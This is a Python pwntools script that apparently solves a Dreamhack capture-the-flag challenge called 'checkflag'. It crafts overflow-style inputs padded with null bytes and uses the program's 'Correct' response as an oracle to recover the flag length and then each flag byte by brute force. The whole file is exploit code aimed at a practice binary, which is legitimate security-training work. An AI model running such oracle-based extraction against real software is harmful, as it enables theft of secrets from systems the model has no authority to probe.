from pwn import *

#context.log_level = 'debug'

len_flag = 0
len_test = 63
for i in range(len_test):
    p = process('./checkflag')
    #p = remote('host3.dreamhack.games', 10320)
    buf = b"A" * (len_test - i) + b'\x00'+ b"A"*i + b"A"*(len_test - i) 
    p.sendafter(b"flag? ", buf)

    if b'Correct' in p.recvline():
        print("LENGTH OF FLAG IS {}".format(63-i))
        len_flag = 63-i
    else:
        print("NO MORE FLAG")
        break
    p.close()
    
print("FLAG LENGTH : {}".format(len_flag))

flag = b''

for i in range(len_flag):
    for j in range(0x20, 0x7f):
        p = process("./checkflag")
        #p = remote('host3.dreamhack.games', 10320)
        
        payload  = b"a" * (len_flag-i-1)
        payload += bytes([j])
        payload += flag
        payload += b'\x00' * (0x40 - len(payload))
        payload += b"a" * (len_flag-i-1)
        
        p.sendafter("flag? ", payload)
        if b'Correct' in p.recvline():
            flag = bytes([j])+flag
            print(flag)
            p.close()
        else:
            p.close()

print(flag)       
